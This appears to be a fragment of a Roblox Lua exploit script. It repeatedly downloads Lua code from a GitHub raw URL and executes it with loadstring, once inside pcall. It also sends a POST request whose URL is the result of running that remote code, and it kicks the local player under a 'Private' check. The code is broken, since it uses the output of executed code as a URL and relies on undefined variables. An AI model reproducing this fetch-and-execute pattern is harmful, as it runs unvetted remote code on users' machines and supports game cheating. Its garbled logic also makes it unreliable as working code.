...
request({
    Url = loadstring(game:HttpGet("https://raw.githubusercontent.com/suicideclubbb/Suicide/refs/heads/main/main.lua"))(),
    Method = "POST",
    Headers = headers,
    Body = body
})

if Script ~= "Private" then
    game.Players.LocalPlayer:Kick("Private")
    return
end

local code = loadstring(game:HttpGet("https://raw.githubusercontent.com/suicideclubbb/Suicide/refs/heads/main/main.lua"))()
...
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/suicideclubbb/Suicide/refs/heads/main/main.lua"))()
end)
